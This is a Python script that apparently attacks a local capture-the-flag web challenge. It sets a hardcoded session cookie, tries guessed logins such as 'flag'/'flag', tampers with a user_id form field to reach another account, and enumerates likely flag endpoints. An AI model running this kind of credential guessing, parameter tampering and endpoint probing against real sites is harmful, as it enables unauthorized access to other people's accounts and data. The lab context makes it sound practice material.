import requests
import re
from urllib.parse import urlencode

BASE_URL = "http://127.0.0.1:33029"
SESSION_COOKIE = "eyJ1c2VyX2lkIjoxMDAzMn0.ac6Z5w.L4Dx_bmHgYdRTXc80ol3P3GoeoY"

session = requests.Session()
session.cookies.set("session", SESSION_COOKIE)

print("=" * 80)
print("ANALYZING POST BEHAVIOR AND ERROR MESSAGES")
print("=" * 80)

headers = {'Content-Type': 'application/x-www-form-urlencoded'}

print("\n[1] POST to /password/test with correct credentials")
print("-" * 80)
form_data = {'username': 'test', 'password': 'test'}
r = session.post(f"{BASE_URL}/password/test", data=urlencode(form_data), headers=headers)
print(f"Status: {r.status_code}")
print(f"Location: {r.headers.get('Location', 'N/A')}")
print(f"Response:\n{r.text}")

print("\n[2] POST to /password/flag with incorrect credentials")
print("-" * 80)
form_data = {'username': 'flag', 'password': 'wrong'}
r = session.post(f"{BASE_URL}/password/flag", data=urlencode(form_data), headers=headers)
print(f"Status: {r.status_code}")
print(f"Response:\n{r.text}")

# Check if there's any different behavior when we use the form with user_id
print("\n" + "=" * 80)
print("[3] POST with form containing user_id field")
print("=" * 80)

for user_id in ['10032', '10052']:
    form_data = {
        'username': 'test', 
        'password': 'test',
        'user_id': user_id
    }
    r = session.post(f"{BASE_URL}/password/test", data=urlencode(form_data), 
                     headers={'Content-Type': 'application/x-www-form-urlencoded'},
                     allow_redirects=True)
    
    print(f"\nuser_id={user_id}:")
    print(f"  Status: {r.status_code}")
    print(f"  URL: {r.url}")
    
    # Check welcome message
    welcome = re.search(r'Welcome, ([^!<]+)', r.text)
    if welcome:
        print(f"  Welcome: {welcome.group(1).strip()}")
    
    # Check for FLAG
    if "FLAG{" in r.text:
        print(f"  [!] FLAG FOUND!")
        print(f"  Response:\n{r.text}")

print("\n" + "=" * 80)
print("[4] Check if flag user has password 'flag' via submit button flow")
print("=" * 80)

# Actually go through the proper login flow as the flag user
# First, let's see what happens when we go to /password/flag and try to login

session2 = requests.Session()  # Fresh session
form_data = {'username': 'flag', 'password': 'flag'}
r = session2.post(f"{BASE_URL}/password/flag", data=urlencode(form_data), 
                  headers={'Content-Type': 'application/x-www-form-urlencoded'},
                  allow_redirects=True)

print(f"Status: {r.status_code}")
print(f"Final URL: {r.url}")
print(f"Cookies: {dict(session2.cookies)}")
print(f"Response:\n{r.text[:1500]}")

# If we got a session, check dashboard
if 'session' in [c.name for c in session2.cookies]:
    dash = session2.get(f"{BASE_URL}/dashboard")
    print(f"\nDashboard content:\n{dash.text}")

print("\n" + "=" * 80)
print("[5] Exhaustive check for any endpoint that might reveal the flag")
print("=" * 80)

# Try to find the flag user's data through any means
# Maybe there's a flag endpoint or similar

flag_endpoints = [
    '/flag', '/flags', '/getflag', '/get_flag',
    '/ctf', '/challenge', '/secret',
    '/password/flag/data', '/password/flag/info',
    '/user/flag', '/users/flag',
    '/data/10052', '/info/10052', '/account/10052'
]

for endpoint in flag_endpoints:
    try:
        r = session.get(f"{BASE_URL}{endpoint}", timeout=3)
        if r.status_code != 404:
            print(f"\n{endpoint}: Status {r.status_code}, Length {len(r.text)}")
            
            if "FLAG{" in r.text:
                print(f"[!] FLAG FOUND!\n{r.text}")
    except:
        pass

print("\n" + "=" * 80)
print("[6] Check dashboard response more carefully")
print("=" * 80)

dash = session.get(f"{BASE_URL}/dashboard")
print(f"Status: {dash.status_code}")
print(f"Headers: {dict(dash.headers)}")
print(f"Full response:\n{dash.text}")

# Search for any hidden data in dashboard
print("\n[7] Search for all potential secrets in dashboard")
hidden_data = re.findall(r'[A-Za-z0-9_\-]{10,}', dash.text)
interesting = [x for x in hidden_data if len(x) > 15 and not x.startswith('bootstrap') and not x.startswith('jquery')]
print(f"Interesting strings: {set(interesting)}")

print("\n[ANALYSIS COMPLETE]")

